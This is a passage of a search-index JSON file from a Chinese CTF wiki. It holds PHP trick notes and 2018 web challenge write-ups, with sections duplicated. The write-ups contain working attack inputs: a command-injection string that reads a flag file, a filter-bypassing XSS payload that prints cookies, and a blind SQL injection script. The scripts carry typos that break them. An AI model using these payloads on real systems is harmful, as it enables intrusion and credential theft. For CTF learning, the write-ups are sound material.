if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\<|\\>/', $v2)){ die(\"error v2\"); } if(preg_match('/ctf/', $v1)){ getFlag($v1,$v2); } } \u770b\u5230\u4e00\u5806\u8fc7\u6ee4\u7684\u5934\u5927\uff0c\u4f46\u662f\u770b\u5230 getFlag \u51fd\u6570\u5f53\u4e2d\u6709\u4e24\u4e2a $$ \uff0c\u6240\u4ee5\u5bf9\u4e8e\u8be5\u9898\uff0c\u53ea\u8981\u628a$GLOBALS\u8d4b\u503c\u7ed9v2\uff0c\u7136\u540ev2\u518d\u8d4b\u503c\u7ed9v1,\u5373\u53ef\u5c06\u5168\u90e8\u53d8\u91cf\u8f93\u51fa payload\uff1a v1=ctf&v2=GLOBALS","title":"\u8d85\u5168\u5c40\u53d8\u91cf$GLOBALS"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#phpfilter","text":"payload: file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php post:contents=? ? \u8fd9\u79cd\u662f\u5c06\u5b57\u7b26\u4e24\u4f4d\u4e24\u4f4d\u8fdb\u884c\u4ea4\u6362","title":"php://filter\u7684\u4e00\u4e9b\u5e38\u89c1\u914d\u5408\u7f16\u7801"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/python/","text":"","title":"Index"},{"location":"WriteUp/2018/Web/","text":"Web \u00b6 \u2003\u20032018 \u5e74\u7684 Web \u9898\u77e5\u8bc6\u70b9\u90fd\u6bd4\u8f83\u57fa\u7840\uff0c\u57fa\u672c\u6bcf\u9898\u90fd\u53ea\u6d89\u53ca\u5230\u4e00\u4e2a\u77e5\u8bc6\u70b9\u3002 \u7b7e\u5230 \u00b6 \u8003\u5bdf\u8981\u70b9\uff1a \u6d4f\u89c8\u5668\u5f00\u53d1\u8005\u5de5\u5177\uff08F12\uff09\uff0cJSFuck \u7f16\u7801 \u6253\u5f00\u9898\u76ee\u53d1\u73b0\u662f\u4e00\u4e2a\u7f51\u9875\uff0c\u6709\u4e00\u4e2a\u8f93\u5165\u6846 \u4efb\u610f\u8f93\u5165\u5b57\u7b26\u8fd4\u56de\u201c\u597d\u50cf\u4e0d\u5bf9\u201d\uff0c\u505a Web \u9898\u76ee\u9047\u4e8b\u4e0d\u51b3\u5148 F12 \u770b\u4e00\u4e0b\uff0c\u53d1\u73b0\u6e90\u4ee3\u7801\u91cc\u6709\u4e00\u4e32 JSFuck \u4ee3\u7801\u3002 \u5229\u7528\u5728\u7ebf\u5de5\u5177 JSFuck \u89e3\u7801\u5de5\u5177\u8fdb\u884c\u89e3\u7801\uff0c\u6216\u8005\u590d\u5236 JSFuck \u4ee3\u7801\u5230\u6d4f\u89c8\u5668\u5f00\u53d1\u8005\u5de5\u5177 console \u8fd0\u884c\uff0c\u5373\u53ef\u5f97\u5230 flag\u3002 \u8ba1\u7b97\u5668 \u00b6 \u8003\u5bdf\u8981\u70b9\uff1a \u5199\u811a\u672c\u80fd\u529b \u6253\u5f00\u540e\u9875\u9762\u5982\u4e0b\u56fe \u8981\u6c42\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u56de\u7b54 20 \u9053\u6570\u5b66\u9898\u76ee\uff0c\u6bcf\u9053\u6700\u591a 3s,\u6700\u5c11 1s\uff0c\u591a\u6b21\u5237\u65b0\u540e\u53d1\u73b0\u9898\u76ee\u7684\u957f\u5ea6\uff0c\u8fd0\u7b97\u65b9\u6cd5\u5747\u4e0d\u5b9a\uff0c\u60f3\u5230\u9760\u811a\u672c\u8ba1\u7b97\uff0cF12 \u5ba1\u67e5\u540e\u53d1\u73b0\uff0c\u9898\u76ee\u7684\u5185\u5bb9\u88ab\u5206\u5728\u591a\u4e2a\u5143\u7d20\u4e2d\uff0c\u5982\u679c\u4f7f\u7528\u6b63\u5219\u5339\u914d\u7684\u8bdd\u5339\u914d\u96be\u5ea6\u8f83\u5927\uff0c\u8003\u8651\u7528 webdriver\uff0c\u6309\u7167 xpath \u6765\u67e5\u627e\u5143\u7d20\uff0c\u5bf9\u5176\u8fdb\u884c\u6574\u5408\uff0c\u8ba1\u7b97\u4e0e\u63d0\u4ea4\uff0c\u811a\u672c\u5185\u5bb9\u5982\u4e0b import requests import time import re from selenium import webdriver driver = webdriver . Firefox () driver . get ( \"http://120.78.66.77:81\" ) for j in range ( 1 , 21 ): string = '' i = 1 while driver . find_element_by_xpath ( \"//body/form[1]/div[ {} ]\" . format ( i )) . text != '=' : string += driver . find_element_by_xpath ( \"//body/form[1]/div[ {} ]\" . format ( i )) . text i += 1 answer = eval ( string ) driver . find_element_by_xpath ( \"//body/form[1]/input[1]\" ) . send_keys ( answer ) time . sleep ( 1 ) driver . find_element_by_xpath ( \"//body/form[1]/input[2]\" ) . click () Cat? \u00b6 \u8003\u67e5\u8981\u70b9\uff1a \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c \u6253\u5f00\u94fe\u63a5\uff0cF12 \u540e\u770b\u5230\u6ce8\u91ca\u4e2d\u6709\u63d0\u793a \u6839\u636e\u63d0\u793a\u6253\u5f00\uff1a http://120.78.66.77:87/exec.php?view_source \u770b\u5230\u6e90\u7801\u540e\u5206\u6790\u4e00\u4e0b\u53d1\u73b0\u8f93\u5165\u662f\u9650\u5236\u4e86\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc7 21 \u7684\uff0c\u5e76\u4e14\u5fc5\u987b\u8f93\u5165 ip \u683c\u5f0f\uff0c\u7136\u540e\u60f3\u5230\u547d\u4ee4\u884c\u6ce8\u5165\uff1a command1 && command2 #\u5148\u6267\u884c command1 \u540e\u6267\u884c command2 command1 | command2 #\u53ea\u6267\u884c command2 command1 & command2 #\u5148\u6267\u884c command2 \u540e\u6267\u884c command1 \u5c1d\u8bd5\u8f93\u5165\uff1a 8.8.8.8|ls,\u7ed3\u679c\u5982\u4e0b\uff0c\u6240\u4ee5 flag \u5e94\u8be5\u662f\u5728 flag.php \u4e2d\u7684 \u518d\u5c1d\u8bd5\u8f93\u5165\uff1a8.8.8.8|cat flag.php \u7ed3\u679c\u6ca1\u6709\u4efb\u4f55\u8fd4\u56de\uff0c\u6211\u4eec\u6293\u5305\u770b\u4e00\u4e0b\uff0c\u5728 repeater \u4e2d\u770b\u5230\u8fd4\u56de\u4e86 flag\u3002 \u7b80\u5355\u7684 XSS \u00b6 \u8003\u67e5\u8981\u70b9\uff1a \u7b80\u5355 XSS Payload \u6784\u9020 Hint\uff1a\u4e3a\u5565\u4e0d\u770b\u770b cookie \u5462 Hint\uff1aMarkdown \u517c\u5bb9\u5927\u591a\u6570 html \u8bed\u6cd5\u7684 \u53cd\u5c04\u578b xss\uff0c\u5c31\u662f\u6d4f\u89c8\u5668\u8f93\u5165->\u540e\u53f0\u5904\u7406->\u8fd4\u56de\u6d4f\u89c8\u5668\u663e\u793a\uff0c\u542c\u8bf4 markdown \u517c\u5bb9\u5927\u591a\u6570 html \u8bed\u6cd5\uff0c\u9898\u76ee\u662f xss \u90a3\u5c31\u8bd5\u8bd5\u54af\uff0c\u4f7f\u7528< script>alert(1);< /script>\u9a8c\u8bc1\u4e00\u4e0b xss \u6f0f\u6d1e,\u53d1\u73b0\u56de\u663e\u662f<>alert(1); script \u6d88\u5931\u4e86\u3002\u8bf4\u660e\u8fdb\u4e86\u540e\u53f0\uff0c\u5e76\u4e14\u88ab\u8f6c\u6362\u6210\u4e86 null\u3002\u53cc\u6301 script \u7ed5\u8fc7\u3002 < scscriptript> \u6253\u5370 cookie \u6784\u9020 Payload: < scscriptript>document.write(document.cookie)< /scrscriptipt>\u5f97\u5230 flag \u4e00\u9053\u5165\u95e8\u7684\u4ee3\u7801\u5ba1\u8ba1 \u00b6 \u8003\u67e5\u8981\u70b9\uff1a PHP \u4ee3\u7801\u5ba1\u8ba1 \u5229\u7528 php \u5f31\u7c7b\u578b\u8bed\u8a00\u7684\u5224\u65ad\u6f0f\u6d1e\uff0c\u7528\u54c8\u5e0c\u503c\u5f00\u5934\u662f 0e \u7684\u6784\u9020 payload; \u83b7\u53d6\u542b\u6709 flag \u94fe\u63a5\u7684\u7f51\u9875\uff0c\u70b9\u8fdb\u53bb\u53d1\u73b0\u6ca1\u6709\u8bbf\u95ee\u6743\u9650\u3002\u5c1d\u8bd5\u5404\u79cd\u65b9\u6cd5\u66f4\u6539 http \u5934\u90e8\u5185\u5bb9\uff0c\u6dfb\u52a0 refer,\u66f4\u6539 cookie\u2026\u2026Burpsuit \u6293\u5305\u66f4\u6539 permission \u4e3a nqzva(rot13 \u52a0\u5bc6\u540e\u7684 admin) Burpsuit \u53ef\u4ee5\u770b\u5230\u8fd4\u56de\u4e86\u6587\u4ef6\u7684\u94fe\u63a5\uff0c\u76f4\u63a5\u8bbf\u95ee\u94fe\u63a5\u5e76\u6ca1\u6709\u4e1c\u897f\u3002\u518d\u5c06\u8bf7\u6c42\u653e \u5728 burpsuite \u67e5\u770b\uff0c\u8fd4\u56de too slow\u3002\u8003\u8651\u7528\u811a\u672c\u3001burpsuit \u4e0d\u65ad\u53d1\u5305\u8bf7\u6c42\u3002 Burpsuite\u2014\u2014>Send to Intruder\u2014\u2014>Payload\u2014\u2014>Generate 100 payloads \u2014\u2014>Start attack; \u811a\u672c\u5982\u4e0b import requests r1 = requests . Session () while ( 1 ): r2 = r1 . get ( \"http://120.78.66.77:85/u/18f6dceefd3014a4b73e4b131776afa248ea810c/flag\" ) print ( r2 . text ) \u7136\u540e\u53ef\u4ee5\u5f97\u5230\u7ed3\u679c\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u767b\u5f55\u4e00\u4e0b \u00b6 \u8003\u67e5\u8981\u70b9\uff1a SQL \u6ce8\u5165 \u6253\u5f00\u9898\u76ee\u5730\u5740\uff0c\u53d1\u73b0\u662f\u4e2a\u767b\u5f55\u754c\u9762\uff0c\u5148\u8d70\u6d41\u7a0b\uff0c\u7528\u4ee3\u7897\u5b66\u59d0\u6700\u65b0\u6362\u7684 AWVS10.5 \u626b\u4e00\u626b\u8fd9\u4e2a\u7f51\u7ad9\uff0c\u770b\u770b\u6709\u6ca1\u6709\u6e90\u7801\u6cc4\u6f0f\u6216\u8005\u5176\u4ed6\u53ef\u4ee5\u626b\u5230\u7684\u6f0f\u6d1e\uff0c\u4e00\u822c\u6765\u8bb2\u7528 AWVS \u53ef\u4ee5\u626b\u5230\u4e00\u4e9b\u51fa\u9898\u4eba\u6545\u610f\u7559\u4e0b\u7684\u7ebf\u7d22\uff0c\uff08\u5982 git \u6cc4\u6f0f\uff0csvn \u6cc4\u6f0f\u6216\u8005.bak \u6cc4\u6f0f\u7b49\u7b49\uff09\uff0c\u626b\u63cf\u51fa\u4e86\u51e0\u4e2a\u5217\u76ee\u5f55\u7684\u6f0f\u6d1e\u4f46\u662f\u5e76\u6ca1\u6709\u4ec0\u4e48\u7528\u3002 \u63a5\u7740\u7528 Burp \u6293\u5305\uff0c\u770b\u770b\u670d\u52a1\u5668\u7ed9\u6211\u4eec\u8fd4\u56de\u7684\u5305\u91cc\u9762\u6709\u4ec0\u4e48\u7ebf\u7d22\uff08burp \u7684\u4f7f\u7528\u6559\u7a0b http://www.uml.org.cn/safe/201406135.asp \uff09\u5728\u6d4f\u89c8\u5668\u4e2d\u8bbe\u7f6e\u6210 burp \u4f7f\u7528\u7684\u4ee3\u7406\uff0c\u7136\u540e\u8bbf\u95ee\u767b\u5f55\u9875\u9762\uff0c\u53d1\u73b0\u4e86\u63d0\u793a\u3002\u987a\u4fbf\u4e00\u63d0\uff0c\u5c3d\u7ba1\u8fd9\u9053\u9898\u4e2d\u51fa\u9898\u4eba\u628a\u63d0\u793a\u85cf\u5728\u4e86\u9875\u9762\u6e90\u7801\u4e2d\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728\u6d4f\u89c8\u5668\u91cc\u770b\u5230\uff0c\u5927\u5e08\u5176\u4ed6\u9898\u7ed9\u7684\u63d0\u793a\u6709\u53ef\u80fd\u5728 cookies \u751a\u81f3\u670d\u52a1\u5668\u81ea\u5b9a\u4e49\u7684\u8fd4\u56de\u5934\u91cc\u9762\uff0c\u800c\u8fd9\u4e9b\u4e1c\u897f\u90fd\u80fd\u5728 burp \u7684\u6293\u5305\u4e2d\u770b\u5230\uff0c\u6240\u4ee5\u6211\u4eec\u6700\u597d\u8fd8\u662f\u7528 burp \u6765\u627e hint \u63d0\u793a\u544a\u8bc9\u4e86\u6211\u4eec\u6570\u636e\u5e93\u7684\u4e00\u4e9b\u4fe1\u606f\uff0c\u7ed3\u5408\u9898\u76ee\u53ef\u4ee5\u731c\u5230\u662f\u8981\u6211\u4eec\u901a\u8fc7 SQL \u6ce8\u5165\u6765\u83b7\u53d6\u5bc6\u7801\u3002 \u6d4b\u8bd5\u8fd9\u9053\u9898\u5bf9\u4e0a\u4f20\u6570\u636e\u7684\u9650\u5236\uff0c\u6211\u4eec\u9996\u5148\u53d1\u73b0\u5982\u679c\u6211\u4eec\u63d0\u4ea4\u7684\u6570\u636e\u4e2d\u5904\u51fa\u73b0\u4e86\u5173\u952e\u5b57\uff0c\u670d\u52a1\u5668\u5c31\u4f1a\u8fd4\u56de naive\u3002\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u670d\u52a1\u5668\u662f\u5426\u8fd4\u56de na\u00efve \u6765\u6d4b\u8bd5\u4e00\u4e2a\u5173\u952e\u5b57\u662f\u5426\u88ab\u7981\u6b62\uff0c\u7ecf\u8fc7\u624b\u52a8\u6d4b\u8bd5\uff08\u5176\u5b9e\u6700\u597d\u81ea\u5df1\u51c6\u5907\u4e00\u4efd\u5b57\u5178\u7528 burp \u6279\u91cf\u6d4b\u8bd5\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u88ab\u7981\u6b62\u7684\u5173\u952e\u5b57\u6709\uff1aunion select from where and \u4ee5\u53ca\u7a7a\u683c\u548c\u7a7a\u683c\u7684\u5404\u7c7b\u66ff\u4ee3\uff08%0a %0b /**/\u4e4b\u7c7b\uff09 substr \u8fd8\u6709/*\u3002\u5404\u7c7b\u7ed5\u8fc7\u624b\u6bb5\u5747\u65e0\u6548\uff0c\u5982\u5927\u5c0f\u5199\u66ff\u6362\uff0cURL \u7f16\u7801 \u770b\u4f3c\u65e0\u89e3\u7684\u9898\u76ee\u5728\u6709 hint \u7684\u60c5\u51b5\u4e0b\u6211\u4eec\u4ecd\u65e7\u80fd\u591f\u6784\u9020\u8bed\u53e5\u6765\u7ed5\u8fc7\u5b83\u3002\u5728\u6211\u4eec\u53d1\u52a8 SQL \u6ce8\u5165\u653b\u51fb\u524d\uff0c\u6211\u4eec\u8981\u9996\u5148\u5224\u65ad\u8fd9\u4e2a\u6ce8\u5165\u70b9\u7684\u7c7b\u578b\uff0c\u4e00\u822c\u7684\u6ce8\u5165\u6709 UNION \u6ce8\u5165\uff0c\u62a5\u9519\u6ce8\u5165\uff0c\u5e03\u5c14\u6ce8\u5165\uff0c\u4ee5\u53ca\u65f6\u95f4\u5dee\u6ce8\u5165\uff08\u7c7b\u4f3c DNS \u6ce8\u5165\u7684\u9ed1\u79d1\u6280\u5148\u4e0d\u7ba1\uff09\u3002 \u8fd9\u9053\u9898\u628a Union \u5173\u952e\u5b57\u7ed9\u9650\u5236\u4e86\uff0c\u8fd8\u4e0d\u62a5\u9519.\u56e0\u6b64\u6211\u4eec\u9996\u5148\u8003\u8651\u5e03\u5c14\u6ce8\u5165\u3002\u5e03\u5c14\uff08BOOL) \u8fd9\u4e2a\u542c\u8d77\u4f86\u5f88\u5947\u602a\uff0c\u5176\u5b9e\u8bf4\u767d\u4e86\u5c31\u662f\u6784\u9020\u5224\u65ad\u8bed\u53e5\u8ba9\u670d\u52a1\u5728\u8bed\u53e5\u7ed3\u679c\u4e3a\u771f\u6216\u8005\u4e3a\u5047\u7684\u65f6\u5019 \u8fd4\u518b\u4e0d\u540c\u7ed3\u679c\uff0c\u636e\u6b64\u6765\u83b7\u53d6\u4fe1\u606f\u3002 \u53ef\u4ee5\u53d1\u73b0\u5982\u679c\u7528\u6237\u540d\u8f93\u5165 admin\uff0c\u5bc6\u7801\u4e71\u8f93\uff0c\u4f1a\u63d0\u793a\u6211\u4eec password error,\u4f46\u5982\u679c\u662f\u5176\u5b83\u7528 \u6237\u540d\uff0c\u5b83\u5c31\u4f1a\u63d0\u793a no such user\u3002\u8fd9\u8868\u660e\u53ef\u80fd\u53ef\u4ee5\u5728\u7528\u6237\u540d\u90a3\u91cc\u4e0b\u624b\u6ce8\u5165\u3002 \u6d4b\u8bd5\u53d1\u73b0\u7528\u6237\u540d\u4e3a admin\u2019&&(1)# \u4e3a password error\uff0c\u4e3a admin\u2019&&(0)#\u65f6\u4e3a no such user,\u5e03\u5c14\u6ce8\u5165\u5b9e\u9524\uff01\u8fd9\u4e2a&&\u7684\u610f\u601d\u662f\u548c\uff0c\u53ef\u4ee5\u4ee3\u66ff and\uff0c\u800c#\u662f\u6ce8\u91ca\u7b26\u53f7\u7528\u4e8e\u6ce8\u91ca\u540e\u9762\u7684\u8bed\u53e5\u3002 \u6211\u4eec\u53ef\u4ee5\u5047\u5b9a\u8fd9\u4e2a\u767b\u5f55\u8bed\u53e5\u662f\u8fd9\u6837\u7684 select pwd from table name where uname= \u2019\u4f60\u8f93\u5165\u7684\u2019 \u628a\u521a\u521a\u8f93\u5165\u7684\u4ee3\u8fdb\u53bb\u5c31\u662f select pwd from table_name where uname=\u2019adminl&&(1)#' ,\u5982\u679c\u62ec\u53f7\u5185\u7684\u5185\u5bb9\u4e3a\u771f\uff08\u975e 0)\u5c31\u80fd\u591f\u8fd4\u56de\u7ed3\u679c\uff08password error)\uff0c\u4e0d\u80fd\u7684\u8bdd\u5c31\u65e0\u6cd5\u8fd4\u56de (no such user) \u73b0\u5728\u5f00\u59cb\u5c1d\u8bd5\u628a\u521a\u624d\u62ec\u53f7\u5185\u7684\u5185\u5bb9\u6362\u6210 length(pwd),\u8fd9\u4e2a length \u51fd\u6570\u53ef\u4ee5\u53d6\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u957f\u5ea6,\u6574\u4e2a\u8bed\u53e5\u5c31\u6210\u4e86 select pwd from table_name where uname='adminl&&(length(pwd) )#\u2019 \u8fd4\u56de\u7684\u662f password error! \u8fd9\u8bf4\u660e pwd \u771f\u7684\u5b58\u5728\uff0c\u800c\u4e14\u53ef\u8bbf\u95ee\uff0c\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u52a0\u4e0a\u5404\u7c7b\u5224\u65ad\u8bed\u53e5\u6765\u5224\u65ad pwd \u7684\u957f\u5ea6 \u4e8e\u662f\u5c31\u75af\u72c2\u6d4b\u8bd5 \u5728\u6d4b\u8bd5\u7684\u65f6\u5019\uff0c\u65b9\u4fbf\u8d77\u89c1.\u53ef\u4ee5\u628a\u6293\u5230\u7684\u767b\u5f55\u5305\u653e\u5728 Burp \u7684 repeater \u4e2d\uff0c\u4f46\u662f\u4e00\u5b9a\u8981\u628a& \u6362\u6210\uff0526,\u5426\u5219\u670d\u52a1\u5668\u4f1a\u628a&\u540e\u9762\u7684\u5f53\u4f5c\u53e6\u4e00\u4e2a\u4e0a\u4f20\u7684\u53c2\u6570\u3002\u53d1\u73b0\u8fd9\u4e2a\u5bc6\u7801\u957f\u5ea6\u4e3a 30 (\u5988\u7684\u771f\u591f\u957f\uff09 \u6211\u4eec\u73b0\u5728\u9700\u8981\u8003\u8651\u5982\u4f55\u8dd1\u51fa\u6570\u636e\u4e2b\uff0c\u6b63\u5e38\u7684\u5e03\u5c14\u6ce8\u5165\u9700\u8981\u7528 substr \u51fd\u6570\u4e00\u4e2a\u4e00\u4e2a\u5730\u53d6\u6570\u636e \uff0c\u4f46\u662f\u6211\u4eec\u7684 substr \u88ab\u7981\u4e86\u600e\u4e48\u529e\u5462\uff1f\u6211\u4eec\u8fd8\u6709 left \u548c right \u51fd\u6570\u53ef\u4ee5\u53d6\u3002\u811a\u672c\u5982\u4e0b\uff1a import requests from concurrent.futures import ThreadPoolExecutor from concurrent import futures url = \"http://120.78.66.77:84/fb69d7b4467e33c71b0153e62f7e2bf0/\" head = { \"Content-Type\" : \"application/x-www-form-unlencoded\" } #\u4e0d\u52a0\u4e0a\u670d\u52a1\u5668\u4e0d\u8ba4 data = \"uname=admin' %26% 26ascii(right(left(pwd,curlen),1))-curascii#&pwd=\" pwd = '_' * 31 def Check ( curlen ): global pwd data = \"uname=admin' %26% 26ascii(right(left(pod,curlen),1))BOOL#&pwd=\" . replace ( \"curlen\" , str ( curlen )) #\u5148\u66ff\u6362\u4f4d\u6570 start = 0 end = 255 while start <= end : #\u6b64\u5904\u4e8c\u5206 mid = ( start + end ) // 2 page = requests . post ( url = url , headers = head , data = data , replace ( \"BOOL\" , \"=\" + str ( mid ))) . text if \"error\" in page : pwd = pwd [: curlen ] + chr ( mid ) + pwd [ curlen + 1 :] print ( pwd [ 1 :]) return chr ( mid ) page = requests . post ( url = url , headers = head , data = data , replace ( \"BOOL\" , \"<\" + str ( mid ))) . text if \"error\" in page : end = mid - 1 else start = mid + 1 with ThreadPoolExecutor ( max_workders = 20 ) as executor : futurn_list = list () for curlen in range ( 1 , 31 ): future = executor . submit ( Check , curlen ) future_list . appent ( future ) print ( \"\u5bc6\u7801\u662f\" + pwd [ 1 :]) \u4e00\u9053\u8239\u7ec6\u7684\u5916\u90e8\u9898\u76ee \u00b6 \u8003\u67e5\u8981\u70b9\uff1a Linux \u5907\u4efd\u6587\u4ef6\uff0c\u8d26\u53f7\u5bc6\u7801\u7206\u7834\uff0cPHP \u6587\u4ef6\u540e\u7f00\u540d\u7ed5\u8fc7 \u5148 F12,\u770b\u5230\u63d0\u793a info.php \u53d1\u73b0 info.php \u88ab\u5220\u9664\uff0c\u770b\u770b\u5907\u4efd\u6587\u4ef6.bak \u67e5\u770b\u6587\u4ef6\uff0c\u6307\u660e\u4e86\u7206\u7834\u7684\u65b9\u5f0f\u548c\u8d26\u6237&\u5bc6\u7801\u96c6\u5408\uff0c\u53ea\u662f\u6709\u70b9\u5927\uff0c\u811a\u672c\u751f\u6210\u7206\u7834\u6587\u4ef6\uff0c\u914d\u7f6e\u5230 burp \u91cc\uff0c\u9759\u9759\u7b49\u5f85\u2026\u2026\u2026\u5927\u6982\u51e0\u5341\u5206\u949f\u5427 \u767b\u5f55\u540e\u8ba9\u4e0a\u4f20 PHP \u6587\u4ef6\uff0c\u7531\u6e90\u7801\u53d1\u73b0\u5176\u5b9e\u53ea\u662f\u4e0a\u4f20\u4e86\u6587\u4ef6\u540d\uff0c\u4f46\u662f\u666e\u901a\u7684 php \u6587\u4ef6\u65e0\u6cd5\u4e0a\u4f20\uff0c\u8fd9\u65f6\u60f3\u5230\u4e86 PHP \u7684\u4e00\u79cd\u522b\u540d\uff1aphps,\u4e00\u79cd\u7279\u6b8a\u7684 php \u6587\u4ef6\uff0c\u5f97\u5230 flag","title":"Web"},{"location":"WriteUp/2018/Web/#web","text":"2018 \u5e74\u7684 Web \u9898\u77e5\u8bc6\u70b9\u90fd\u6bd4\u8f83\u57fa\u7840\uff0c\u57fa\u672c\u6bcf\u9898\u90fd\u53ea\u6d89\u53ca\u5230\u4e00\u4e2a\u77e5\u8bc6\u70b9\u3002","title":"Web"},{"location":"WriteUp/2018/Web/#_1","text":"\u8003\u5bdf\u8981\u70b9\uff1a \u6d4f\u89c8\u5668\u5f00\u53d1\u8005\u5de5\u5177\uff08F12\uff09\uff0cJSFuck \u7f16\u7801 \u6253\u5f00\u9898\u76ee\u53d1\u73b0\u662f\u4e00\u4e2a\u7f51\u9875\uff0c\u6709\u4e00\u4e2a\u8f93\u5165\u6846 \u4efb\u610f\u8f93\u5165\u5b57\u7b26\u8fd4\u56de\u201c\u597d\u50cf\u4e0d\u5bf9\u201d\uff0c\u505a Web \u9898\u76ee\u9047\u4e8b\u4e0d\u51b3\u5148 F12 \u770b\u4e00\u4e0b\uff0c\u53d1\u73b0\u6e90\u4ee3\u7801\u91cc\u6709\u4e00\u4e32 JSFuck \u4ee3\u7801\u3002 \u5229\u7528\u5728\u7ebf\u5de5\u5177 JSFuck \u89e3\u7801\u5de5\u5177\u8fdb\u884c\u89e3\u7801\uff0c\u6216\u8005\u590d\u5236 JSFuck \u4ee3\u7801\u5230\u6d4f\u89c8\u5668\u5f00\u53d1\u8005\u5de5\u5177 console \u8fd0\u884c\uff0c\u5373\u53ef\u5f97\u5230 flag\u3002","title":"\u7b7e\u5230"},{"location":"WriteUp/2018/Web/#_2","text":"\u8003\u5bdf\u8981\u70b9\uff1a \u5199\u811a\u672c\u80fd\u529b \u6253\u5f00\u540e\u9875\u9762\u5982\u4e0b\u56fe \u8981\u6c42\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u56de\u7b54 20 \u9053\u6570\u5b66\u9898\u76ee\uff0c\u6bcf\u9053\u6700\u591a 3s,\u6700\u5c11 1s\uff0c\u591a\u6b21\u5237\u65b0\u540e\u53d1\u73b0\u9898\u76ee\u7684\u957f\u5ea6\uff0c\u8fd0\u7b97\u65b9\u6cd5\u5747\u4e0d\u5b9a\uff0c\u60f3\u5230\u9760\u811a\u672c\u8ba1\u7b97\uff0cF12 \u5ba1\u67e5\u540e\u53d1\u73b0\uff0c\u9898\u76ee\u7684\u5185\u5bb9\u88ab\u5206\u5728\u591a\u4e2a\u5143\u7d20\u4e2d\uff0c\u5982\u679c\u4f7f\u7528\u6b63\u5219\u5339\u914d\u7684\u8bdd\u5339\u914d\u96be\u5ea6\u8f83\u5927\uff0c\u8003\u8651\u7528 webdriver\uff0c\u6309\u7167 xpath \u6765\u67e5\u627e\u5143\u7d20\uff0c\u5bf9\u5176\u8fdb\u884c\u6574\u5408\uff0c\u8ba1\u7b97\u4e0e\u63d0\u4ea4\uff0c\u811a\u672c\u5185\u5bb9\u5982\u4e0b import requests import time import re from selenium import webdriver driver = webdriver . Firefox () driver . get ( \"http://120.78.66.77:81\" ) for j in range ( 1 , 21 ): string = '' i = 1 while driver . find_element_by_xpath ( \"//body/form[1]/div[ {} ]\" . format ( i )) . text != '=' : string += driver . find_element_by_xpath ( \"//body/form[1]/div[ {} ]\" . format ( i )) . text i += 1 answer = eval ( string ) driver . find_element_by_xpath ( \"//body/form[1]/input[1]\" ) . send_keys ( answer ) time . sleep ( 1 ) driver . find_element_by_xpath ( \"//body/form[1]/input[2]\" ) . click ()","title":"\u8ba1\u7b97\u5668"},{"location":"WriteUp/2018/Web/#cat","text":"\u8003\u67e5\u8981\u70b9\uff1a \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c \u6253\u5f00\u94fe\u63a5\uff0cF12 \u540e\u770b\u5230\u6ce8\u91ca\u4e2d\u6709\u63d0\u793a \u6839\u636e\u63d0\u793a\u6253\u5f00\uff1a http://120.78.66.77:87/exec.php?view_source \u770b\u5230\u6e90\u7801\u540e\u5206\u6790\u4e00\u4e0b\u53d1\u73b0\u8f93\u5165\u662f\u9650\u5236\u4e86\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc7 21 \u7684\uff0c\u5e76\u4e14\u5fc5\u987b\u8f93\u5165 ip \u683c\u5f0f\uff0c\u7136\u540e\u60f3\u5230\u547d\u4ee4\u884c\u6ce8\u5165\uff1a command1 && command2 #\u5148\u6267\u884c command1 \u540e\u6267\u884c command2 command1 | command2 #\u53ea\u6267\u884c command2 command1 & command2 #\u5148\u6267\u884c command2 \u540e\u6267\u884c command1 \u5c1d\u8bd5\u8f93\u5165\uff1a 8.8.8.8|ls,\u7ed3\u679c\u5982\u4e0b\uff0c\u6240\u4ee5 flag \u5e94\u8be5\u662f\u5728 flag.php \u4e2d\u7684 \u518d\u5c1d\u8bd5\u8f93\u5165\uff1a8.8.8.8|cat flag.php \u7ed3\u679c\u6ca1\u6709\u4efb\u4f55\u8fd4\u56de\uff0c\u6211\u4eec\u6293\u5305\u770b\u4e00\u4e0b\uff0c\u5728 repeater \u4e2d\u770b\u5230\u8fd4\u56de\u4e86 flag\u3002","title":"Cat?"},{"location":"WriteUp/2018/Web/#xss","text":"\u8003\u67e5\u8981\u70b9\uff1a \u7b80\u5355 XSS Payload \u6784\u9020 Hint\uff1a\u4e3a\u5565\u4e0d\u770b\u770b cookie \u5462 Hint\uff1aMarkdown \u517c\u5bb9\u5927\u591a\u6570 html \u8bed\u6cd5\u7684 \u53cd\u5c04\u578b xss\uff0c\u5c31\u662f\u6d4f\u89c8\u5668\u8f93\u5165->\u540e\u53f0\u5904\u7406->\u8fd4\u56de\u6d4f\u89c8\u5668\u663e\u793a\uff0c\u542c\u8bf4 markdown \u517c\u5bb9\u5927\u591a\u6570 html \u8bed\u6cd5\uff0c\u9898\u76ee\u662f xss \u90a3\u5c31\u8bd5\u8bd5\u54af\uff0c\u4f7f\u7528< script>alert(1);< /script>\u9a8c\u8bc1\u4e00\u4e0b xss \u6f0f\u6d1e,\u53d1\u73b0\u56de\u663e\u662f<>alert(1); script \u6d88\u5931\u4e86\u3002\u8bf4\u660e\u8fdb\u4e86\u540e\u53f0\uff0c\u5e76\u4e14\u88ab\u8f6c\u6362\u6210\u4e86 null\u3002\u53cc\u6301 script \u7ed5\u8fc7\u3002 < scscriptript> \u6253\u5370 cookie \u6784\u9020 Payload: < scscriptript>document.write(document.cookie)< /scrscriptipt>\u5f97\u5230 flag","title":"\u7b80\u5355\u7684 